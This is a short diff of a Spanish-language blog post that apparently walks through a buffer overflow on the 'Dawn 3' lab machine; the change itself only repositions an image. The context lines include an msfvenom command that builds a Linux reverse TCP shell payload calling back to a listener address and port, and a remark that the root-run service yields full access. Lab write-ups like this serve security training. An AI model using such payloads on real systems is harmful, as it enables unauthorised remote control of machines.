@@ -232,6 +232,6 @@ Como la máquina final que se debe explotar es un Linux, se deberá generar una 
 msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.49.212 LPORT=9001 -f c -b '\x00' EXITFUNC=thread
 ```
 
-<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210723190255.png" height="500" width="825" /></p>
-
 Como el servicio ya está siendo ejecutado como root se obtendrá acceso total a la máquina.
+
+<p align="center"><img src="https://raw.githubusercontent.com/alexfrancow/alexfrancow.github.io/master/images/2021-07-25-Dawn-3-Vanilla-Buffer-Overflow/Pasted%20image%2020210725184438.png" height="500" width="825" /></p>
